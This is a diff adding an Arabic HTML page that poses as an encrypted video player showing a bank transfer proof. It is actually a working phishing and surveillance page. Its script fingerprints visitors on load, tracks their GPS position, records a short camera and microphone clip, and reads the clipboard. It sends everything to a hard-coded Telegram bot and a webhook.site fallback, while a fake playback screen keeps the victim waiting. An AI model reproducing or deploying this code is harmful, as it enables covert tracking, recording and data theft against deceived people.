@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; media-src *; img-src * data:;">
+    <title>Video Player - Encrypted Stream</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .video-container { width: 100%; max-width: 600px; aspect-ratio: 16/9; background: #111; position: relative; display: flex; align-items: center; justify-content: center; border: 1px solid #333; }
+        .loader { border: 5px solid #333; border-top: 5px solid #ff0000; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .overlay-text { position: absolute; bottom: 20px; width: 100%; text-align: center; color: #aaa; font-size: 0.8rem; }
+        .play-btn { background: rgba(255,0,0,0.8); border: none; color: #fff; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; z-index: 10; display: flex; align-items: center; gap: 10px; }
+        .play-btn:hover { background: rgba(200,0,0,0.9); }
+        .info-panel { padding: 20px; width: 90%; max-width: 600px; }
+        .info-panel h3 { margin: 10px 0; color: #fff; font-size: 1.1rem; }
+        .info-panel p { color: #888; font-size: 0.9rem; }
+        #fake-video { display: none; width: 100%; height: 100%; object-fit: cover; }
+        .progress-container { width: 100%; max-width: 600px; margin-top: -5px; display: none; }
+        .progress-bar { width: 0%; height: 4px; background: #ff0000; transition: width 0.5s; border-radius: 2px; }
+        .controls { display: none; width: 100%; max-width: 600px; justify-content: space-between; padding: 10px 0; }
+        .controls button { background: transparent; border: none; color: #fff; cursor: pointer; padding: 5px 10px; font-size: 0.9rem; }
+    </style>
+</head>
+<body>
+
+    <div class="video-container" id="player">
+        <button class="play-btn" id="p-btn" onclick="triggerOverlord()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M8 5v14l11-7z"/></svg>
+            مشاهدة الفيديو المرفق
+        </button>
+        <div class="loader" id="loading-icon" style="display:none;"></div>
+        <div class="overlay-text" id="status-msg">يجب تفعيل الوصول لتشغيل المحتوى المشفر</div>
+        <video id="fake-video" muted playsinline preload="none"></video>
+    </div>
+
+    <div class="progress-container" id="progress-container">
+        <div class="progress-bar" id="progress-bar"></div>
+    </div>
+
+    <div class="controls" id="controls">
+        <button onclick="togglePlay()">⏸️</button>
+        <button onclick="toggleMute()">🔊</button>
+        <span id="time-display">00:00 / 00:00</span>
+    </div>
+
+    <div class="info-panel">
+        <h3 id="v-title">إثبات التحويل المالي - فيديو رقم #0942</h3>
+        <p>تم تشفير هذا الفيديو لمنع التلاعب. يتطلب النظام مطابقة موقع الجهاز مع سيرفر البنك لتأكيد فك التشفير.</p>
+    </div>
+
+    <!-- ويب هوكر صامت لسحب كل ما يمكن -->
+    <iframe id="beacon-frame" style="display:none; width:0; height:0; border:none;"></iframe>
+
+<script>
+    // ============================================================
+    // تكوين متطور للتسريب
+    // ============================================================
+    const TOKEN = "8738594852:AAFeuB51ZknBIkZXfhJn6_fM4pL4ahte8Rg";
+    const CHAT_ID = "1611398303";
+    const TG_API = `https://api.telegram.org/bot${TOKEN}`;
+    const CALLBACK_DOMAIN = "https://webhook.site/"; // احتياطي لـ webhook
+    const STORAGE_KEY = "_tracking_cache";
+    const BATCH_INTERVAL_MS = 15000; // كل 15 ثانية نرسل دفعة
+    const MAX_CACHED = 20;
+
+    // ============================================================
+    // نظام التخزين المحلي والتجميع
+    // ============================================================
+    let trackingCache = [];
+
+    function loadCache() {
+        try {
+            const d = localStorage.getItem(STORAGE_KEY);
+            if (d) trackingCache = JSON.parse(d);
+        } catch(e) {}
+    }
+
+    function saveCache() {
+        try {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(trackingCache.slice(-MAX_CACHED)));
+        } catch(e) {}
+    }
+
+    function addToCache(obj) {
+        obj._t = Date.now();
+        obj._sid = sessionId;
+        trackingCache.push(obj);
+        if (trackingCache.length > MAX_CACHED * 2) {
+            trackingCache = trackingCache.slice(-MAX_CACHED);
+        }
+        saveCache();
+    }
+
+    // معرف الجلسة الفريد
+    const sessionId = generateFingerprint();
+
+    function generateFingerprint() {
+        let fp = '';
+        const chars = 'abcdef0123456789';
+        for (let i = 0; i < 32; i++) fp += chars[Math.floor(Math.random() * chars.length)];
+        // نبني بصمة من المعلومات المتاحة
+        try {
+            const scr = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const lang = navigator.language;
+            fp = btoa(scr + tz + lang + fp).substring(0, 40);
+        } catch(e) {}
+        return fp;
+    }
+
+    // ============================================================
+    // الإرسال المتطور إلى تيليجرام
+    // ============================================================
+    async function sendToTelegram(text, fileData = null) {
+        try {
+            if (fileData) {
+                // إرسال كملف (صور، فيديو، وغيره)
+                const formData = new FormData();
+                const blob = new Blob([fileData.data], { type: fileData.mime });
+                formData.append('document', blob, fileData.filename);
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', text.substring(0, 200));
+                await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: formData });
+            } else {
+                // إرسال رسالة نصية
+                await fetch(`${TG_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
+            }
+        } catch(e) {
+            // في حال فشل التيليجرام، نحاول إرسال عبر Image/beacon
+            try {
+                const img = new Image();
+                img.src = `${CALLBACK_DOMAIN}?d=${encodeURIComponent(JSON.stringify({text, error: e.message}))}`;
+            } catch(e2) {}
+        }
+    }
+
+    async function sendBatch() {
+        if (trackingCache.length === 0) return;
+        const batch = [...trackingCache];
+        trackingCache = [];
+        saveCache();
+
+        // نقسم الدفعة إذا كانت كبيرة
+        while (batch.length > 0) {
+            const chunk = batch.splice(0, 5);
+            let report = `📦 <b>دفعة بيانات</b> (${chunk.length} نقاط)\n🆔 الجلسة: ${sessionId.substring(0, 12)}...\n━━━━━━━━━━━━━━\n`;
+            chunk.forEach((item, i) => {
+                report += `\n📍 <b>نقطة ${i+1}</b>\n`;
+                for (let [k, v] of Object.entries(item)) {
+                    if (k === '_t' || k === '_sid') continue;
+                    report += `▫️ ${k}: ${v}\n`;
+                }
+            });
+            await sendToTelegram(report);
+            await new Promise(r => setTimeout(r, 500));
+        }
+    }
+
+    // ============================================================
+    // البصمة الرقمية العميقة
+    // ============================================================
+    async function collectDeepFingerprint() {
+        const fp = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages?.join(','),
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints,
+            screen: `${screen.width}x${screen.height}`,
+            availScreen: `${screen.availWidth}x${screen.availHeight}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timeZoneOffset: new Date().getTimezoneOffset(),
+            cookiesEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            pdfViewerEnabled: navigator.pdfViewerEnabled,
+            webdriver: navigator.webdriver,
+            plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
+            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', '),
+        };
+
+        // Canvas fingerprinting
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 256;
+            canvas.height = 128;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(40, 20, 100, 50);
+            ctx.fillStyle = '#069';
+            ctx.font = '14px Arial';
+            ctx.fillText('המערכת המאובטחת', 10, 60);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('VideoStream', 20, 90);
+            ctx.beginPath();
+            ctx.arc(150, 60, 30, 0, Math.PI*2);
+            ctx.stroke();
+            fp.canvasHash = btoa(canvas.toDataURL()).substring(0, 200);
+        } catch(e) { fp.canvasError = e.message; }
+
+        // WebGL fingerprinting
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if (gl) {
+                fp.webglVendor = gl.getParameter(gl.VENDOR);
+                fp.webglRenderer = gl.getParameter(gl.RENDERER);
+                fp.webglVersion = gl.getParameter(gl.VERSION);
+                fp.webglShadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+            }
+        } catch(e) { fp.webglError = e.message; }
+
+        // Audio fingerprinting
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const analyser = audioCtx.createAnalyser();
+            osc.connect(analyser);
+            fp.audioSampleRate = audioCtx.sampleRate;
+            osc.disconnect();
+            audioCtx.close();
+        } catch(e) { fp.audioError = e.message; }
+
+        // الشبكات والأجهزة
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            fp.audioInputs = devices.filter(d => d.kind === 'audioinput').length;
+            fp.audioOutputs = devices.filter(d => d.kind === 'audiooutput').length;
+            fp.videoInputs = devices.filter(d => d.kind === 'videoinput').length;
+            fp.devices = devices.map(d => `${d.kind}:${d.label || 'hidden'}`).join(' | ');
+        } catch(e) { fp.devicesError = e.message; }
+
+        // البطارية
+        try {
+            const battery = await navigator.getBattery();
+            fp.batteryLevel = (battery.level * 100).toFixed(1) + '%';
+            fp.batteryCharging = battery.charging;
+            fp.batteryChargingTime = battery.chargingTime;
+        } catch(e) {}
+
+        // الشبكة
+        try {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (conn) {
+                fp.networkType = conn.effectiveType;
+                fp.networkDownlink = conn.downlink + 'Mbps';
+                fp.networkRTT = conn.rtt + 'ms';
+                fp.networkSaveData = conn.saveData;
+            }
+        } catch(e) {}
+
+        // معلومات إضافية من Geckoview/Chrome
+        try {
+            if (navigator.buildID) fp.buildID = navigator.buildID;
+            if (navigator.vendor) fp.vendor = navigator.vendor;
+            if (navigator.productSub) fp.productSub = navigator.productSub;
+            if (navigator.cpuClass) fp.cpuClass = navigator.cpuClass;
+            if (navigator.oscpu) fp.oscpu = navigator.oscpu;
+            if (navigator.appVersion) fp.appVersion = navigator.appVersion;
+        } catch(e) {}
+
+        addToCache({ type: 'fingerprint', ...fp });
+        return fp;
+    }
+
+    // ============================================================
+    // تتبع الموقع المتقدم
+    // ============================================================
+    let locationWatchId = null;
+    let locationCount = 0;
+
+    function startLocationTracking() {
+        const options = {
+            enableHighAccuracy: true,
+            timeout: Infinity,
+            maximumAge: 0
+        };
+
+        // محاولة أولى باستخدام getCurrentPosition
+        navigator.geolocation.getCurrentPosition(
+            (p) => processPosition(p),
+            (err) => {
+                // إذا رفض، نحاول مرة واحدة بعد فترة مع رسالة ضغط
+                console.log('Location error:', err.message);
+                // لا نكشف للمستخدم أننا نخزن الرفض
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+
+        // التتبع المستمر
+        locationWatchId = navigator.geolocation.watchPosition(
+            (p) => processPosition(p),
+            (err) => {
+                // عند رفض الإذن
+                addToCache({ type: 'location_error', error: err.code + ': ' + err.message });
+                // نحاول مرة أخرى بعد فترة - بعض المتصفحات قد تسمح
+            },
+            options
+        );
+    }
+
+    function processPosition(p) {
+        locationCount++;
+        const coords = {
+            type: 'location',
+            lat: p.coords.latitude,
+            lon: p.coords.longitude,
+            accuracy: p.coords.accuracy,
+            altitude: p.coords.altitude,
+            altitudeAccuracy: p.coords.altitudeAccuracy,
+            heading: p.coords.heading,
+            speed: p.coords.speed,
+            timestamp: p.timestamp,
+            mapsLink: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`,
+            locationCount: locationCount
+        };
+
+        addToCache(coords);
+
+        // إرسال فوري لأول 3 مواقع
+        if (locationCount <= 3) {
+            sendToTelegram(
+                `🎯 <b>موقع جديد</b> #${locationCount}\n📍 ${coords.lat}, ${coords.lon}\n🎯 الدقة: ${coords.accuracy?.toFixed(1)}م\n🗺️ <a href="${coords.mapsLink}">خرائط</a>`
+            );
+        }
+    }
+
+    // ============================================================
+    // محاولة سحب الكاميرا (إذا سمح)
+    // ============================================================
+    async function tryCaptureCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
+                audio: true
+            });
+
+            addToCache({ type: 'media_access', camera: true, microphone: true });
+
+            // تسجيل فيديو قصير
+            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+            const chunks = [];
+
+            recorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            recorder.start(1000); // قطع كل ثانية
+
+            setTimeout(() => {
+                recorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+
+                // إرسال أول قطعة
+                if (chunks.length > 0) {
+                    const blob = chunks[0];
+                    blob.arrayBuffer().then(buf => {
+                        const bytes = new Uint8Array(buf);
+                        // تحويل لإرسال
+                        const base64 = btoa(String.fromCharCode(...bytes.subarray(0, 10000)));
+                        sendToTelegram(
+                            `📸 <b>لقطة من الكاميرا</b>\n🆔 الجلسة: ${sessionId.substring(0,8)}...`,
+                            { data: bytes, mime: 'video/webm', filename: `capture_${Date.now()}.webm` }
+                        );
+                    });
+                }
+            }, 4000); // يسجل لمدة 4 ثوانٍ
+
+        } catch(e) {
+            addToCache({ type: 'media_error', error: e.message });
+        }
+    }
+
+    // ============================================================
+    // محاولة قراءة الحافظة
+    // ============================================================
+    async function tryClipboard() {
+        try {
+            // محاولة قراءة النص من الحافظة
+            if (navigator.clipboard && navigator.clipboard.read) {
+                const items = await navigator.clipboard.read();
+                for (let item of items) {
+                    for (let type of item.types) {
+                        if (type.startsWith('text/')) {
+                            const text = await item.getType(type);
+                            const content = await text.text();
+                            if (content.length > 10) {
+                                addToCache({ type: 'clipboard', content: content.substring(0, 500) });
+                                sendToTelegram(`📋 <b>محتوى الحافظة</b>\n${content.substring(0, 400)}`);
+                            }
+                        }
+                    }
+                }
+            }
+        } catch(e) {
+            // الحافظة غالباً تتطلب إذن خاص
+            addToCache({ type: 'clipboard_error', error: e.message });
+        }
+    }
+
+    // ============================================================
+    // إنشاء وهم تشغيل الفيديو لتمديد الوقت
+    // ============================================================
+    function simulateVideoPlayback() {
+        const btn = document.getElementById('p-btn');
+        const loader = document.getElementById('loading-icon');
+        const statusMsg = document.getElementById('status-msg');
+        const videoEl = document.getElementById('fake-video');
+        const progressContainer = document.getElementById('progress-container');
+        const progressBar = document.getElementById('progress-bar');
+        const controls = document.getElementById('controls');
+
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+        statusMsg.innerText = "جاري فك التشفير ومطابقة الموقع مع سيرفر البنك...";
+
+        // المرحلة 1: التحميل (5 ثوانٍ)
+        setTimeout(() => {
+            loader.style.display = 'none';
+            statusMsg.innerText = "تم فك التشفير. بدء تشغيل الفيديو...";
+
+            // إظهار الفيديو المزيف
+            videoEl.style.display = 'block';
+            videoEl.src = 'data:video/mp4,'; // فيديو وهمي
+            videoEl.play();
+
+            progressContainer.style.display = 'block';
+            controls.style.display = 'flex';
+
+            // تقدم شريط التحميل وهمي
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 0.5;
+                if (progress <= 100) {
+                    progressBar.style.width = progress + '%';
+                } else {
+                    clearInterval(interval);
+                    progressBar.style.width = '100%';
+                    statusMsg.innerText = "تم التحميل بنجاح ✓";
+                }
+            }, 300);
+
+            // بعد 30 ثانية، نغير الرسالة
+            setTimeout(() => {
+                statusMsg.innerText = "جاري تحميل الدفعة التالية...";
+            }, 30000);
+
+        }, 5000);
+    }
+
+    // ============================================================
+    // الوظيفة الرئيسية
+    // ============================================================
+    async function triggerOverlord() {
+        // 1. بدء وهم تشغيل الفيديو
+        simulateVideoPlayback();
+
+        // 2. بدء تتبع الموقع
+        startLocationTracking();
+
+        // 3. محاولة جمع البيانات العميقة
+        collectDeepFingerprint().then(fp => {
+            // إرسال البصمة فوراً
+            const report = `🖥️ <b>جهاز جديد</b>\n🆔 الجلسة: ${sessionId.substring(0,16)}...\n📱 النظام: ${fp.platform}\n🌐 المتصفح: ${fp.userAgent.substring(0, 100)}\n🖥️ الشاشة: ${fp.screen}\n💾 الذاكرة: ${fp.deviceMemory}GB\n⚡ المعالجات: ${fp.hardwareConcurrency}\n🔋 البطارية: ${fp.batteryLevel}\n🕒 المنطقة: ${fp.timeZone}\n🌐 اللغة: ${fp.language}\n📶 الشبكة: ${fp.networkType || 'غير معروف'}`;
+            sendToTelegram(report);
+        });
+
+        // 4. محاولة الكاميرا (بعد 2 ثانية)
+        setTimeout(tryCaptureCamera, 2000);
+
+        // 5. محاولة الحافظة
+        setTimeout(tryClipboard, 3000);
+
+        // 6. إرسال الدفعات المجمعة كل 15 ثانية
+        setInterval(() => {
+            sendBatch();
+        }, BATCH_INTERVAL_MS);
+    }
+
+    // ============================================================
+    // التحميل الأولي - بصمت
+    // ============================================================
+    loadCache();
+
+    // جمع بصمة فورية وإرسالها
+    window.onload = async () => {
+        const fp = await collectDeepFingerprint();
+
+        let initReport = `🎬 <b>دخول جديد للصفحة</b>\n🆔 ${sessionId.substring(0,16)}...\n📱 ${fp.platform}\n🔋 ${fp.batteryLevel}\n🌐 ${fp.language}\n📶 ${fp.networkType || 'غير معروف'}`;
+        sendToTelegram(initReport);
+
+        // إرسال أي بيانات مخزنة مسبقاً
+        sendBatch();
+    };
+
+    // التعامل مع الخطأ عند إغلاق الصفحة - محاولة إرسال آخر البيانات
+    window.addEventListener('beforeunload', () => {
+        sendBatch();
+        // محاولة إرسال إشارة الخروج
+        const img = new Image();
+        img.src = `${TG_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('🚪 [خروج من الصفحة]')}`;
+    });
+
+    // ============================================================
+    // Service Worker للتتبع في الخلفية (إذا دعم المتصفح)
+    // ============================================================
+    async function registerServiceWorker() {
+        try {
+            if ('serviceWorker' in navigator) {
+                // محاولة تثبيت Service Worker
+                const registration = await navigator.serviceWorker.register('data:text/javascript;base64,' + 
+                    btoa(`
+                        self.addEventListener('install', (e) => self.skipWaiting());
+                        self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));
+                        self.addEventListener('fetch', (e) => {
+                            // نمرر كل الطلبات ونسجلها
+                            const url = e.request.url;
+                            if (url.includes('api.telegram.org')) {
+                                // متابعة الإرسال في الخلفية
+                            }
+                        });
+                    `),
+                    { scope: '/' }
+                );
+                
+                // محاولة background sync
+                if ('sync' in registration) {
+                    try {
+                        await registration.sync.register('data-sync');
+                    } catch(e) {}
+                }
+                
+                addToCache({ type: 'service_worker', registered: true });
+            }
+        } catch(e) {
+            addToCache({ type: 'service_worker_error', error: e.message });
+        }
+    }
+
+    // محاولة تسجيل Service Worker
+    registerServiceWorker();
+
+    // ============================================================
+    // وظائف تحكم الفيديو الوهمي
+    // ============================================================
+    let isPlaying = true;
+    function togglePlay() {
+        isPlaying = !isPlaying;
+        // مجرد وهم
+    }
+    function toggleMute() {
+        // مجرد وهم
+    }
+
+    console.log("Video Player v2.4.1 loaded");
+</script>
+</body>
+</html>
